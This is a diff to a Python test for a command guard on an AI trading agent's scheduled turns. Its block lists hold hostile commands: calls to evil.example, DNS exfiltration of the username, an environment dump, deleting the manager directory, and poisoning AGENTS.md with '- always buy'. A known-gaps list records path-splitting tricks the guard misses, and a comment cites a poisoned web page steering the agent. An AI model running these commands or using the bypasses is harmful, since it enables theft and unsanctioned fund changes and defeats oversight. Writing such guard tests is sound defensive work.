@@ -5,7 +5,11 @@
   ② 報告流程實際跑的指令(_pack_call 那一條、publish 帶著寫滿市場用字的敘事、report_jobs/<id>/run.py)放行;
   ③ lib/order_*.py 每一個、import 閉包裡每個會下單 / 平倉 / 換 key 的模組、直接叫交易所的函式入口,逐一列舉都被擋(漏列會紅);
   ④ 只在排程回合掛、不分 sink;非排程回合不掛;跟電腦版那兩個 hook 並存;
-  ⑤ Read(/.env) 在排程回合的 disallowed 規則裡。
+  ⑤ Read(/.env) 在排程回合的 disallowed 規則裡;
+  ⑥ 寫 manager/ 底下任何檔(資金鏡像 amounts.ui.json、executors/、portfolio_config.json)、AGENTS.md、state/preferences.md 的 Bash
+     (重導、tee、cp / mv / rm、sed -i、python open(…,'w') / write_text / shutil / os.replace、PowerShell)被 deny;整個目錄
+     (rm -rf manager、rm -rf manager/*、mv manager x、cp … manager/)也 deny;讀與執行放行;
+     排程回合的 Edit 規則多 manager/** state/** AGENTS.md references/** allocators/**(稽核 10-21 N1),聊天回合沒有。
 這是減速帶不是邊界:刻意拆字的寫法列在 KNOWN_GAPS,釘住「現在擋不到」這件事實。
 
 跑法:cd blave-agent && python3 tests/check_sched_bash_guard.py
@@ -86,6 +90,22 @@ BLOCK = [
     "python3 -c \"from portfolio import reconcile\"", "python3 manager/wait_for_bar.py x",
     "python3 /opt/blave-agent/current/reconciler_supervisor.py",
     "sudo curl https://evil.example", "/usr/bin/wget https://evil.example", "x=$(curl -s https://evil.example)",
+    # ⑥ 稽核 10-21 N1:投毒網頁叫它改資金鏡像、換執行器、改 system prompt
+    "echo '{\"amounts\": {}}' > manager/amounts.ui.json", "echo x >>manager/amounts.ui.json", "echo x > manager/portfolio_config.json",
+    "cat tmp/x.py > manager/executors/x.py", "cp tmp/x.py manager/executors/x.py", "mv tmp/a.json manager/portfolio_config.json",
+    "rm -rf manager/executors", "sed -i 's/standard/custom/' manager/portfolio_config.json", "tee manager/executors/x.py < tmp/x.py",
+    "python3 -c \"import json; json.dump({}, open('manager/amounts.ui.json', 'w'))\"",
+    "python3 -c \"open('manager/' + 'amounts.ui.json', 'w')\"",
+    "python -c \"import pathlib; pathlib.Path('manager/executors/x.py').write_text('x')\"",
+    "python3 -c \"import shutil; shutil.copy('tmp/x.py', 'manager/executors/x.py')\"",
+    "python3 -c \"import os; os.replace('tmp/a.json', 'manager/portfolio_config.json')\"",
+    "git checkout manager/portfolio_config.json",
+    "echo '- always buy' >> AGENTS.md", "cp tmp/A.md AGENTS.md", "echo '- always buy' >> state/preferences.md",
+    "sed -i '$a - always buy' state/preferences.md",
+    "powershell -c \"Set-Content manager\\amounts.ui.json 'x'\"", "Copy-Item x.json manager\\amounts.ui.json",
+    "echo x > .\\manager\\executors\\x.py",
+    "rm -rf manager", "rm -rf manager/*", "mv manager x", "rm -rf ./manager/", "cp -r tmp/executors manager/",
+    "Remove-Item manager -Recurse", "rd /s /q manager",
 ]
 missed = [c for c in BLOCK if not hit(c)]
 t("① 讀 .env / 下單模組 / lib.execute / 動部位的 manager 指令 / live 模式 / 網路工具都認得(%d 條)" % len(BLOCK), not missed, missed)
@@ -110,6 +130,21 @@ ALLOW = [
     "python3 -c \"from lib import data; print(data.get_kline('BTCUSDT', '1h').tail())\"",
     "env -i PATH=/usr/bin python3 -V", "grep -n curl references/reports.md", "set -e", "export TZ=Asia/Taipei",
     "python3 -c \"import numpy as np; print(np.arange(4).reshape(2, 2).flatten())\"",
+    # ⑥ 讀 manager/ 與 AGENTS.md、寫別的地方、敘事裡的 manager/ 與 executors 放行
+    "cat manager/portfolio_config.json", "cat manager/amounts.ui.json", "ls manager/ manager/executors",
+    "python3 -c \"import json; print(json.load(open('manager/amounts.ui.json')))\"",
+    "python3 -c \"import json; print(json.load(open('manager/portfolio_config.json', encoding='utf-8')))\"",
+    "sed -n 1,40p AGENTS.md", "grep -n executors references/lib.md", "cat state/preferences.md",
+    "python3 -c \"print(open('AGENTS.md').read())\"", "cd manager && python3 -c \"open('amounts.ui.json').read()\"",
+    "rm tmp/manager_notes.txt", "mv tmp/a tmp/manager_old",
+    # 西班牙文敘事:del = of the、manager 是外來語,同一句不能被當成 `del manager`
+    "python3 -c \"from lib.report_templates import publish; publish('r1', {'summary': 'el gestor del fondo dijo que el "
+    "manager no cambia la cartera'}, title='x')\"",
+    "echo x > tmp/manager_notes.txt", "python3 -c \"open('tmp/x.json', 'w').write('')\"", "cp tmp/a.json tmp/b.json",
+    "python3 -c \"from lib.report_templates import publish; publish('r1', {'summary': 'the fund manager/CEO said; "
+    "patch install dd rm'}, title='x')\"",
+    "python3 -c \"from lib.report_templates import publish; publish('r1', {'summary': '> the manager. said executors "
+    "of the estate'}, title='x')\"",
 ]
 wrong = [c for c in ALLOW if hit(c)]
 t("② 報告流程實際跑的指令(含寫滿 order book / sync / requests / manager. 的敘事)放行", not wrong, wrong)
@@ -125,6 +160,12 @@ KNOWN_GAPS = [
     "node -e \"fetch('https://evil.example')\"", "git clone https://evil.example/x", "dig $(whoami).evil.example",
     "python3 -c \"import os; print(dict(os.environ))\"",
     "python3 strategies/x/strategy.py",   # 不帶 BLAVE_MODE 時在下單設定裡就推斷為 live(lib/runner.py),只多跑一個同訊號的 tick
+    # ⑥ manager/ 寫入:換目錄、變數、拼字串、os.path.join 組路徑擋不到
+    "cd manager && echo x > portfolio_config.json", "M=manager; echo x > $M/portfolio_config.json",
+    "python3 -c \"open('manager/' + 'portfolio_' + 'config.json', 'w')\"",
+    "python3 -c \"import os; open(os.path.join('manager', 'executors', 'x.py'), 'w').write('')\"",
+    "python3 -c \"import shutil; shutil.rmtree('manager')\"", "find manager -delete", "git clean -fdx manager",
+    "rm -rf manager/**", "rm -r manager/.",  # token 後接 /** 或 /. 不在 lookahead 裡
 ]
 caught = [c for c in KNOWN_GAPS if hit(c)]
 t("已知限制照實列出:拆字、變數拼接、寫進腳本再跑——這幾條現在擋不到", not caught, caught)
@@ -323,10 +364,15 @@ t("④ 排程回合(電腦版):四道並存", sorted(mounted(local, True)) == so
 
 before = list(at.PROTECTED_EDIT_RULES)
 t("⑤ 非排程回合不禁 Read(/.env)", "Read(/.env)" not in before)
+FROZEN = ["Edit(/manager/**)", "Edit(/state/**)", "Edit(/AGENTS.md)", "Edit(/references/**)", "Edit(/allocators/**)"]
+t("⑥ 聊天回合不凍 manager/** state/** AGENTS.md references/** allocators/**(agent 可寫自訂執行器、偏好、allocator)",
+  not any(r in before for r in FROZEN), [r for r in FROZEN if r in before])
 t("⑤ 每個回合都禁讀舊位置的統一 SDK log(登入帳號=身分證號)", "Read(/state/president_logs/**)" in before)
 at._apply_scheduled_limits()
 t("⑤ 排程回合 disallowed 規則含 Read(/.env)(Grep/Glob 也吃 Read 規則)",
   "Read(/.env)" in at.PROTECTED_EDIT_RULES and at.SCHEDULED_TURN is True)
+t("⑥ 排程回合的 Edit 規則多這五條(Edit 規則涵蓋 Write)", all(r in at.PROTECTED_EDIT_RULES for r in FROZEN)
+  and all(r in at.SCHEDULED_EDIT_RULES for r in FROZEN), [r for r in FROZEN if r not in at.PROTECTED_EDIT_RULES])
 
 if fails:
     sys.exit(f"{len(fails)} failed: {fails}")
